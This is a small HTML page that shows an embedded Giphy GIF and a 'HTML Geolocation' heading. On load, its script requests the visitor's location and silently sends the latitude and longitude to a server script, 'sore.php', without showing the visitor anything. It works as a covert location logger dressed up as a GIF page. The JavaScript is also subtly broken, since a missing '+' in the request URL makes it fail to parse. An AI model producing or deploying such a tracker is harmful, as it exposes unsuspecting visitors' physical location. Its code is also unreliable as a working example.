<!DOCTYPE html>
<html>
<body onload="getLocation()">

<div style="width:100%;height:0;padding-bottom:100%;position:relative;"><iframe src="https://giphy.com/embed/pNpONEEg3pLIQ" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/bill-murray-yes-pointing-pNpONEEg3pLIQ">via GIPHY</a></p>

<h1>HTML Geolocation</h1>


<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
	const xhttp = new XMLHttpRequest();
	xhttp.open("GET", "sore.php?lat=" + position.coords.latitude "&long=" + position.coords.longitude);
	xhttp.send();
}
</script>

</body>
</html>
